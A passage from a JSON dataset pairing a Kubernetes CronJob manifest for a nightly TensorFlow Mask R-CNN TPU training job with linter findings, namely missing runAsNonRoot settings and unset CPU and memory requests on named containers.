$(OUTPUT_BUCKET)/tf-nightly/maskrcnn/func/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-maskrcnn-func-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"publisher\" is not set to runAsNonRoot"
  },
  {
    "id": "2445",
    "manifest_path": "data/manifests/the_stack_sample/sample_0644.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-nightly-maskrcnn-func-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/detection/main.py\n          - --model=mask_rcnn\n          - \"--params_override=\\\"architecture\\\":\\n  \\\"use_bfloat16\\\": true\\n\\\"eval\\\"\\\n            :\\n  \\\"batch_size\\\": 40\\n  \\\"eval_file_pattern\\\": \\\"$(COCO_DIR)/val*\\\"\\\n            \\n  \\\"val_json_file\\\": \\\"$(COCO_DIR)/instances_val2017.json\\\"\\n\\\"postprocess\\\"\\\n            :\\n  \\\"pre_nms_num_boxes\\\": 1000\\n\\\"predict\\\":\\n  \\\"batch_size\\\": 40\\n\\\n            \\\"train\\\":\\n  \\\"batch_size\\\": 64\\n  \\\"checkpoint\\\":\\n    \\\"path\\\": \\\"\\\n            $(RESNET_PRETRAIN_DIR)/resnet50-checkpoint-2018-02-07\\\"\\n    \\\"prefix\\\"\\\n            : \\\"resnet50/\\\"\\n  \\\"iterations_per_loop\\\": 5000\\n  \\\"total_steps\\\": 1000\\n\\\n            \\  \\\"train_file_pattern\\\": \\\"$(COCO_DIR)/train*\\\"\\n\"\n          - --model_dir=$(MODEL_DIR)\n          - --mode=train\n          - --strategy_type=tpu\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/maskrcnn/func/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/maskrcnn/func/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-maskrcnn-func-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"train\" is not set to runAsNonRoot"
  },
  {
    "id": "2446",
    "manifest_path": "data/manifests/the_stack_sample/sample_0644.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-nightly-maskrcnn-func-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/detection/main.py\n          - --model=mask_rcnn\n          - \"--params_override=\\\"architecture\\\":\\n  \\\"use_bfloat16\\\": true\\n\\\"eval\\\"\\\n            :\\n  \\\"batch_size\\\": 40\\n  \\\"eval_file_pattern\\\": \\\"$(COCO_DIR)/val*\\\"\\\n            \\n  \\\"val_json_file\\\": \\\"$(COCO_DIR)/instances_val2017.json\\\"\\n\\\"postprocess\\\"\\\n            :\\n  \\\"pre_nms_num_boxes\\\": 1000\\n\\\"predict\\\":\\n  \\\"batch_size\\\": 40\\n\\\n            \\\"train\\\":\\n  \\\"batch_size\\\": 64\\n  \\\"checkpoint\\\":\\n    \\\"path\\\": \\\"\\\n            $(RESNET_PRETRAIN_DIR)/resnet50-checkpoint-2018-02-07\\\"\\n    \\\"prefix\\\"\\\n            : \\\"resnet50/\\\"\\n  \\\"iterations_per_loop\\\": 5000\\n  \\\"total_steps\\\": 1000\\n\\\n            \\  \\\"train_file_pattern\\\": \\\"$(COCO_DIR)/train*\\\"\\n\"\n          - --model_dir=$(MODEL_DIR)\n          - --mode=train\n          - --strategy_type=tpu\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/maskrcnn/func/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/maskrcnn/func/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-maskrcnn-func-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"monitor\" has cpu request 0"
  },
  {
    "id": "2447",
    "manifest_path": "data/manifests/the_stack_sample/sample_0644.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-nightly-maskrcnn-func-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/detection/main.py\n          - --model=mask_rcnn\n          - \"--params_override=\\\"architecture\\\":\\n  \\\"use_bfloat16\\\": true\\n\\\"eval\\\"\\\n            :\\n  \\\"batch_size\\\": 40\\n  \\\"eval_file_pattern\\\": \\\"$(COCO_DIR)/val*\\\"\\\n            \\n  \\\"val_json_file\\\": \\\"$(COCO_DIR)/instances_val2017.json\\\"\\n\\\"postprocess\\\"\\\n            :\\n  \\\"pre_nms_num_boxes\\\": 1000\\n\\\"predict\\\":\\n  \\\"batch_size\\\": 40\\n\\\n            \\\"train\\\":\\n  \\\"batch_size\\\": 64\\n  \\\"checkpoint\\\":\\n    \\\"path\\\": \\\"\\\n            $(RESNET_PRETRAIN_DIR)/resnet50-checkpoint-2018-02-07\\\"\\n    \\\"prefix\\\"\\\n            : \\\"resnet50/\\\"\\n  \\\"iterations_per_loop\\\": 5000\\n  \\\"total_steps\\\": 1000\\n\\\n            \\  \\\"train_file_pattern\\\": \\\"$(COCO_DIR)/train*\\\"\\n\"\n          - --model_dir=$(MODEL_DIR)\n          - --mode=train\n          - --strategy_type=tpu\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/maskrcnn/func/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/maskrcnn/func/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-maskrcnn-func-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"publisher\" has cpu request 0"
  },
  {
    "id": "2448",
    "manifest_path": "data/manifests/the_stack_sample/sample_0644.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-nightly-maskrcnn-func-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/detection/main.py\n          - --model=mask_rcnn\n          - \"--params_override=\\\"architecture\\\":\\n  \\\"use_bfloat16\\\": true\\n\\\"eval\\\"\\\n            :\\n  \\\"batch_size\\\": 40\\n  \\\"eval_file_pattern\\\": \\\"$(COCO_DIR)/val*\\\"\\\n            \\n  \\\"val_json_file\\\": \\\"$(COCO_DIR)/instances_val2017.json\\\"\\n\\\"postprocess\\\"\\\n            :\\n  \\\"pre_nms_num_boxes\\\": 1000\\n\\\"predict\\\":\\n  \\\"batch_size\\\": 40\\n\\\n            \\\"train\\\":\\n  \\\"batch_size\\\": 64\\n  \\\"checkpoint\\\":\\n    \\\"path\\\": \\\"\\\n            $(RESNET_PRETRAIN_DIR)/resnet50-checkpoint-2018-02-07\\\"\\n    \\\"prefix\\\"\\\n            : \\\"resnet50/\\\"\\n  \\\"iterations_per_loop\\\": 5000\\n  \\\"total_steps\\\": 1000\\n\\\n            \\  \\\"train_file_pattern\\\": \\\"$(COCO_DIR)/train*\\\"\\n\"\n          - --model_dir=$(MODEL_DIR)\n          - --mode=train\n          - --strategy_type=tpu\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/maskrcnn/func/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/maskrcnn/func/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-maskrcnn-func-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"monitor\" has memory limit 0"
  },
  {
    "id": "2449",
    "manifest_path": "data/manifests/the_stack_sample/sample_0644.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-nightly-maskrcnn-func-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/detection/main.py\n          - --model=mask_rcnn\n          - \"--params_override=\\\"architecture\\\":\\n  \\\"use_bfloat16\\\": true\\n\\\"eval\\\"\\\n            :\\n  \\\"batch_size\\\": 40\\n  \\\"eval_file_pattern\\\": \\\"$(COCO_DIR)/val*\\\"\\\n            \\n  \\\"val_json_file\\\": \\\"$(COCO_DIR)/instances_val2017.json\\\"\\n\\\"postprocess\\\"\\\n            :\\n  \\\"pre_nms_num_boxes\\\": 1000\\n\\\"predict\\\":\\n  \\\"batch_size\\\": 40\\n\\\n            \\\"train\\\":\\n  \\\"batch_size\\\": 64\\n  \\\"checkpoint\\\":\\n    \\\"path\\\": \\\"\\\n            $(RESNET_PRETRAIN_DIR)/resnet50-checkpoint-2018-02-07\\\"\\n    \\\"prefix\\\"\\\n            : \\\"resnet50/\\\"\\n  \\\"iterations_per_loop\\\": 5000\\n  \\\"total_steps\\\": 1000\\n\\\n            \\  \\\"train_file_pattern\\\": \\\"$(COCO_DIR)/train*\\\"\\n\"\n          - --model_dir=$(MODEL_DIR)\n          - --mode=train\n          - --strategy_type=tpu\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/maskrcnn/func/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/maskrcnn/func/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-maskrcnn-func-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"publisher\" has memory limit 0"
  },
  {
    "id": "2450",
    "manifest_path": "data/manifests/the_stack_sample/sample_0644.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-nightly-maskrcnn-func-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/detection/main.py\n          - --model=mask_rcnn\n          - \"--params_override=\\\"architecture\\\":\\n  \\\"use_bfloat16\\\": true\\n\\\"eval\\\"\\\n            :\\n  \\\"batch_size\\\": 40\\n  \\\"eval_file_pattern\\\": \\\"$(COCO_DIR)/val*\\\"\\\n            \\n  \\\"val_json_file\\\": \\\"$(COCO_DIR)/instances_val2017.json\\\"\\n\\\"postprocess\\\"\\\n            :\\n  \\\"pre_nms_num_boxes\\\": 1000\\n\\\"predict\\\":\\n  \\\"batch_size\\\": 40\\n\\\n            \\\"train\\\":\\n  \\\"batch_size\\\": 64\\n  \\\"checkpoint\\\":\\n    \\\"path\\\": \\\"\\\n            $(RESNET_PRETRAIN_DIR)/resnet50-checkpoint-2018-02-07\\\"\\n    \\\"prefix\\\"\\\n            : \\\"resnet50/\\\"\\n  \\\"iterations_per_loop\\\": 5000\\n  \\\"total_steps\\\": 1000\\n\\\n            \\  \\\"train_file_pattern\\\": \\\"$(COCO_DIR)/train*\\\"\\n\"\n          - --model_dir=$(MODEL_DIR)\n          - --mode=train\n          - --strategy_type=tpu\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/maskrcnn/func/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/maskrcnn/func/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    